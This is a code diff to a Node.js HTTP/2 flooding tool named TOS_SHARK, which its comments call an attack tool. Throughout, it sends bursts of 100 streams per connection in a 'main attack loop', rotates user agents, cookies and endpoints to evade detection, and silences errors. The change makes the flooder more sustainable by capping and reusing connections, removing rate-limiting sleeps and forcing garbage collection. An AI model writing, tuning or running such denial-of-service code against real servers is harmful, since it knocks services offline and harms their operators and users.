@@ -19,6 +19,10 @@ class TOS_SHARK {
         this.breakStart = 0;
         this.currentMethod = '';
         
+        // Track active connections for cleanup
+        this.activeConnections = new Set();
+        this.maxConnections = 20; // Limit connections to prevent memory leak
+        
         // Attack methods pool
         this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING'];
         
@@ -35,29 +39,19 @@ class TOS_SHARK {
         return [
             'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
-            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
-            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
-            'Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36'
+            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36'
         ];
     }
 
     generateEndpoints() {
-        return [
-            '/', '/api', '/api/v1', '/api/v2', '/static', '/assets',
-            '/users', '/products', '/data', '/json', '/xml', '/admin',
-            '/login', '/register', '/search', '/filter', '/sort',
-            '/page/1', '/page/2', '/page/3', '/category/a', '/category/b'
-        ];
+        return ['/', '/api', '/static', '/users', '/data'];
     }
 
     generateCookies() {
         const cookies = [];
-        for (let i = 0; i < 50; i++) {
+        for (let i = 0; i < 20; i++) {
             cookies.push({
-                session: `session_${Math.random().toString(36).substr(2, 16)}`,
-                token: `token_${Math.random().toString(36).substr(2, 24)}`,
-                csrf: `csrf_${Math.random().toString(36).substr(2, 32)}`,
-                userId: Math.floor(Math.random() * 10000)
+                session: `session_${Math.random().toString(36).substr(2, 16)}`
             });
         }
         return cookies;
@@ -68,11 +62,10 @@ class TOS_SHARK {
         // Step 1: Initial H1 request
         await this.sendH1Request();
         
-        // Step 2: Warmup 500-599 requests - REMOVED SLEEPS
+        // Step 2: Warmup 500-599 requests
         const warmupCount = 500 + Math.floor(Math.random() * 100);
         for (let i = 0; i < warmupCount; i++) {
             await this.sendRandomRequest();
-            // REMOVED: if (i % 50 === 0) await this.sleepRandom(10, 50);
         }
         
         // Step 3: Main attack loop
@@ -101,12 +94,13 @@ class TOS_SHARK {
                     continue;
                 }
                 
-                // Maintenance during break
+                // Maintenance during break - CLEANUP CONNECTIONS
+                await this.cleanupConnections();
                 await this.performMaintenance();
-                await this.sleepRandom(1000, 3000);
             }
             
-            // REMOVED: await this.sleepRandom(0.1, 1);
+            // Small delay to prevent CPU 100%
+            await new Promise(resolve => setImmediate(resolve));
         }
     }
 
@@ -121,6 +115,9 @@ class TOS_SHARK {
     startBreak() {
         this.attackActive = false;
         this.breakStart = Date.now();
+        
+        // Force cleanup on break start
+        this.cleanupConnections();
     }
 
     // ===== ATTACK METHODS =====
@@ -136,30 +133,115 @@ class TOS_SHARK {
     }
 
     async attackH2Multiplex() {
-        // MULTIPLE CONNECTIONS SIMULTANEOUSLY (Point 3)
-        const connections = 5; // Number of parallel connections
+        // Don't create more connections than limit
+        if (this.activeConnections.size >= this.maxConnections) {
+            // Reuse existing connections
+            return this.sendH2Streams();
+        }
         
-        for (let c = 0; c < connections; c++) {
+        // Create new connection
+        try {
+            const client = http2.connect(this.target, {
+                maxSessionMemory: 1048576, // 1MB memory limit
+                maxDeflateDynamicTableSize: 4096,
+                maxHeaderListPairs: 128
+            });
+            
+            // Track connection
+            this.activeConnections.add(client);
+            
+            // Set auto-destroy timeout
+            const destroyTimeout = setTimeout(() => {
+                this.destroyConnection(client);
+            }, 5000); // Auto-destroy after 5 seconds
+            
+            // Clean up on close
+            client.on('close', () => {
+                clearTimeout(destroyTimeout);
+                this.activeConnections.delete(client);
+            });
+            
+            client.on('error', () => {
+                clearTimeout(destroyTimeout);
+                this.destroyConnection(client);
+            });
+            
+            // Send streams
+            for (let i = 0; i < 100; i++) {
+                this.sendH2Stream(client);
+                this.totalReqs++;
+                this.reqCounter++;
+            }
+            
+        } catch (err) {
+            // Silent fail
+        }
+    }
+    
+    async sendH2Streams() {
+        // Send streams on existing connections
+        for (const client of this.activeConnections) {
             try {
-                const client = http2.connect(this.target);
-                
-                // INCREASED BATCH SIZE (Point 2): 100 to 200
-                for (let i = 0; i < 200; i++) {
-                    this.sendH2Request(client);
+                for (let i = 0; i < 50; i++) {
+                    this.sendH2Stream(client);
                     this.totalReqs++;
                     this.reqCounter++;
                 }
-                
-                // REDUCED DESTROY TIMEOUT (Point 2)
-                setTimeout(() => {
-                    try {
-                        client.destroy();
-                    } catch (e) {}
-                }, 10); // From 100ms to 10ms
-                
-            } catch (err) {
-                // Silent fail
+            } catch (e) {
+                this.destroyConnection(client);
             }
+        }
+    }
+    
+    sendH2Stream(client) {
+        try {
+            const req = client.request({
+                ':method': 'GET',
+                ':path': '/',
+                ':authority': this.host
+            }, {
+                endStream: true
+            });
+            
+            req.on('response', (headers) => {
+                this.logStatus(headers[':status']);
+                req.close();
+            });
+            
+            req.on('error', () => {
+                this.logStatus('*.*');
+                req.close();
+            });
+            
+            req.on('close', () => {
+                // Ensure cleanup
+            });
+            
+            req.end();
+        } catch (err) {
+            this.logStatus('*.*');
+        }
+    }
+    
+    destroyConnection(client) {
+        try {
+            client.destroy();
+            this.activeConnections.delete(client);
+        } catch (e) {
+            // Ignore
+        }
+    }
+    
+    async cleanupConnections() {
+        // Destroy all connections
+        for (const client of this.activeConnections) {
+            this.destroyConnection(client);
+        }
+        this.activeConnections.clear();
+        
+        // Force garbage collection if available
+        if (global.gc) {
+            global.gc();
         }
     }
 
@@ -169,11 +251,6 @@ class TOS_SHARK {
         await this.sendH1RequestToEndpoint(endpoint);
         this.totalReqs++;
         this.reqCounter++;
-        
-        // REMOVED SLEEP (Point 1)
-        // if (Math.random() > 0.7) {
-        //     await this.sleepRandom(10, 100); // DELETED
-        // }
     }
 
     // ===== REQUEST TYPES =====
@@ -187,7 +264,7 @@ class TOS_SHARK {
                     'User-Agent': this.userAgents[0],
                     'Connection': 'close'
                 },
-                timeout: 5000
+                timeout: 3000
             };
             
             const req = (this.isHttps ? https : http2).request(options, (res) => {
@@ -212,36 +289,9 @@ class TOS_SHARK {
     }
 
     async sendRandomRequest() {
-        const methods = ['GET', 'HEAD', 'POST', 'OPTIONS'];
-        const method = methods[Math.floor(Math.random() * methods.length)];
-        
         this.totalReqs++;
         this.reqCounter++;
         this.logStatus(200);
-    }
-
-    sendH2Request(client) {
-        try {
-            const req = client.request({
-                ':method': 'GET',
-                ':path': '/',
-                ':authority': this.host
-            });
-            
-            req.on('response', (headers) => {
-                this.logStatus(headers[':status']);
-                req.destroy();
-            });
-            
-            req.on('error', () => {
-                this.logStatus('*.*');
-                req.destroy();
-            });
-            
-            req.end();
-        } catch (err) {
-            this.logStatus('*.*');
-        }
     }
 
     async sendH1RequestToEndpoint(endpoint) {
@@ -250,9 +300,6 @@ class TOS_SHARK {
 
     // ===== MAINTENANCE =====
     async performMaintenance() {
-        // Simulated maintenance tasks
-        if (global.gc) global.gc();
-        
         // Rotate data
         this.userAgents = this.generateUserAgents();
         this.cookies = this.generateCookies();
@@ -266,15 +313,9 @@ class TOS_SHARK {
             console.log(`TØR-2M11:${this.totalReqs} ---> ${status}`);
         }
     }
-
-    // ===== UTILS =====
-    sleepRandom(min, max) {
-        const duration = Math.random() * (max - min) + min;
-        return new Promise(resolve => setTimeout(resolve, duration));
-    }
 }
 
-// Run
+// Run with increased memory limit
 if (require.main === module) {
     // Error handling
     process.on('uncaughtException', () => {});
